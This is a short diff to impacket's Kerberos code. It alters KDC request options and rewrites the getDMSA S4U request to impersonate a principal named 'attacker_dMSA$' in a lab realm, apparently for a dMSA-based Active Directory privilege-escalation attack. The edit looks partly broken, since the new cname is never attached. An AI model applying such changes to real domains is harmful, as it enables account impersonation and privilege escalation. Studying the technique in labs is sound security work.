@@ -32,7 +32,7 @@ from binascii import unhexlify, hexlify
 
 from impacket.krb5.asn1 import AS_REQ, AP_REQ, TGS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, PA_ENC_TS_ENC, AS_REP, TGS_REP, \
     EncryptedData, Authenticator, EncASRepPart, EncTGSRepPart, seq_set, seq_set_iter, KERB_ERROR_DATA, METHOD_DATA, \
-    ETYPE_INFO2, ETYPE_INFO, AP_REP, EncAPRepPart, S4UUserID
+    ETYPE_INFO2, ETYPE_INFO, AP_REP, EncAPRepPart, S4UUserID, PrincipalName
 from impacket.krb5.types import KerberosTime, Principal, Ticket
 from impacket.krb5.gssapi import CheckSumField, GSS_C_DCE_STYLE, GSS_C_MUTUAL_FLAG, GSS_C_REPLAY_FLAG, \
     GSS_C_SEQUENCE_FLAG, GSS_C_CONF_FLAG, GSS_C_INTEG_FLAG
@@ -145,7 +145,7 @@ def getKerberosTGT(clientName, password, domain, lmhash, nthash, aesKey='', kdcH
     opts = list()
     opts.append( constants.KDCOptions.forwardable.value )
     opts.append( constants.KDCOptions.renewable.value )
-    opts.append( constants.KDCOptions.proxiable.value )
+   # opts.append( constants.KDCOptions.proxiable.value )
     reqBody['kdc-options']  = constants.encodeFlags(opts)
 
     seq_set(reqBody, 'sname', serverName.components_to_asn1)
@@ -305,7 +305,8 @@ def getKerberosTGT(clientName, password, domain, lmhash, nthash, aesKey='', kdcH
         opts = list()
         opts.append( constants.KDCOptions.forwardable.value )
         opts.append( constants.KDCOptions.renewable.value )
-        opts.append( constants.KDCOptions.proxiable.value )
+        opts.append( constants.KDCOptions.renewable_ok.value )
+        #opts.append( constants.KDCOptions.proxiable.value )
         reqBody['kdc-options'] = constants.encodeFlags(opts)
 
         seq_set(reqBody, 'sname', serverName.components_to_asn1)
@@ -518,10 +519,6 @@ def getDMSA(serverName, domain, kdcHost, tgt, cipher, sessionKey, renew = False)
 
     encodedAuthenticator = encoder.encode(authenticator)
 
-    # Key Usage 7
-    # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
-    # TGS authenticator subkey), encrypted with the TGS session
-    # key (Section 5.5.1)
     encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)
 
     apReq['authenticator'] = noValue
@@ -541,8 +538,10 @@ def getDMSA(serverName, domain, kdcHost, tgt, cipher, sessionKey, renew = False)
 
     userid = S4UUserID()
     userid['nonce'] = rand.getrandbits(31)
-    userid['cname'] = Principal(user_to_impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-    userid['crealm'] = domain
+    cname = PrincipalName()
+    cname['name-type'] = constants.PrincipalNameType.NT_PRINCIPAL.value
+    cname['name-string'] = encoder.encode('attacker_dMSA$')
+    userid['crealm'] = 'SEVENKINGDOMS.LOCAL'
     userid['subject-certificate'] = noValue
     userid['options'] = 0x28000000
 
